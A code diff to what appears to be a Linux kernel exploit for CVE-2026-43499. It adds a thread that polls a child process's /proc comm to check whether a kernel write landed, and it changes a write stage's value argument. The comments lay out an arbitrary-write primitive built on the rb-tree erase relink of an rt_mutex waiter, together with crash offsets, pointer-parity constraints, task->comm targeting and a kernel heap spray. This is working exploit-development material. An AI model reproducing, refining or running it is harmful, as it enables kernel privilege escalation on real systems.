@@ -11,6 +11,8 @@
 
 #include "session/backend/cve_2026_43499_backend.hpp"
 
+#include <thread>
+
 #include "attack/ops.hpp"
 #include "common.h"
 #include "kernel/target.h"
@@ -267,9 +269,67 @@ namespace ghostlock::session::backend {
             };
             if (!exact_target) {
                 support::run_state::enter("w3a");
+
+                /* LOCAL DIAGNOSTIC (not for upstream): watch the child's comm
+                 * from the parent while the stage runs.
+                 *
+                 * W3-0 is a leaf-direction probe: it zeroes `child->comm` and
+                 * checks it changed. verify_leaf_dir_stage() does observe that --
+                 * but it runs AFTER the route, and the route is exactly where the
+                 * run dies (run 6, and it wedges rather than oopsing), so the
+                 * observation has never once been recorded. /proc/<pid>/comm is
+                 * readable by the parent, so poll it here and log only changes:
+                 * the host-side log stream survives the wedge, so the last line
+                 * tells us whether the write landed.
+                 *
+                 * Reads only, no pipe traffic, so it cannot interfere with the
+                 * stage's own "M"/report handshake. ~8 s at 20 ms, then it exits.
+                 * See docs/analysis/w3-post-descent-wedge-plan.md. */
+                const int32_t watch_pid = pipes.child();
+                std::thread([watch_pid] {
+                    char path[64];
+                    snprintf(path, sizeof(path), "/proc/%d/comm", watch_pid);
+                    char last[64] = {0};
+                    for (int32_t i = 0; i < 400; i++) {
+                        char buf[64] = {0};
+                        int fd = open(path, O_RDONLY | O_CLOEXEC);
+                        if (fd >= 0) {
+                            ssize_t n = read(fd, buf, sizeof(buf) - 1);
+                            close(fd);
+                            if (n > 0) {
+                                buf[n] = '\0';
+                                for (ssize_t k = 0; k < n; k++) {
+                                    if (buf[k] == '\n') buf[k] = '\0';
+                                }
+                                if (strcmp(buf, last) != 0) {
+                                    pr_info("leaf watch: comm=\"%s\"\n", buf);
+                                    snprintf(last, sizeof(last), "%s", buf);
+                                }
+                            }
+                        }
+                        usleep(20000);
+                    }
+                }).detach();
+
+                /* leaf = 0 on purpose, even though this stage writes to a
+                 * char array a zero would clear. The probe only has to learn
+                 * *where* the pselect erase stores -- [target] or [target+8] --
+                 * and that is a property of the erase arm, not of the value
+                 * stored. A value of 0 forces pc = 0, whose erase arm has no
+                 * parent pointer, so the collateral
+                 * (__rb_change_child(node, leaf, pc & ~3, root)) plants the write
+                 * target in the lock's tree root and the walk's [7] dequeue ->
+                 * enqueue then descends *through the target* as if it were an
+                 * rb_node -- run Q1 faulted at rt_mutex_adjust_prio_chain+0x548
+                 * dereferencing comm+7 ("af_01234") as a node. The page-derived
+                 * value below has a real parent (its low byte is 0x00, so comm
+                 * still reads empty and the probe's branches are unchanged) and
+                 * its collateral lands inside the payload page, which is the
+                 * shape W1 and W2 have survived in every run.
+                 * See docs/analysis/w3-descent-options.md. */
                 Status dir_ok = retry_write_stage<M>(
                     session, "W3-0: leaf dir", child_task + ghostlock::profile::task_comm_off(), 1, 4, 50000,
-                    victim::verify_leaf_dir_stage, &w3_context, 1);
+                    victim::verify_leaf_dir_stage, &w3_context, 0);
                 if (!dir_ok) {
                     /* U01/S14: upstream retires the child instead of guessing the leaf
                  * direction and blind-writing the task neighbour. Returning false
@@ -477,9 +537,17 @@ namespace ghostlock::session::backend {
             return 0;
         }
 
-        /* Both transports write *(target) := value through the erase left-only
-         * relink: waiter words are {pc = value, right = 0, left = target} and
-         * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
+        /* Both transports write := value through the erase left-only relink:
+         * waiter words are {pc = value, right = 0, left = destination}, where the
+         * destination is the target for the pointer layouts and target-1 for the
+         * zero layout (kZeroWritePc in memory/payload_builder.h).
+         *
+         * Beware the trap that this comment used to state as fact: "the node is
+         * RED so no color fixup runs" is false. The erase's own arm runs no color
+         * fixup, but it does plant `left` in the lock's tree root whenever pc has
+         * no parent pointer, and the walk then enqueues -- rb_insert_color() reads
+         * *(left) & 1 and dereferences a NULL grandparent when that word is even.
+         * A zero write must therefore carry an odd pc. */
         attack::timer_mark("  heap spray start");
         (session.heap.current.base) = support::prepare_good_kernel_page(request);
         if (!(session.heap.current.base)) {
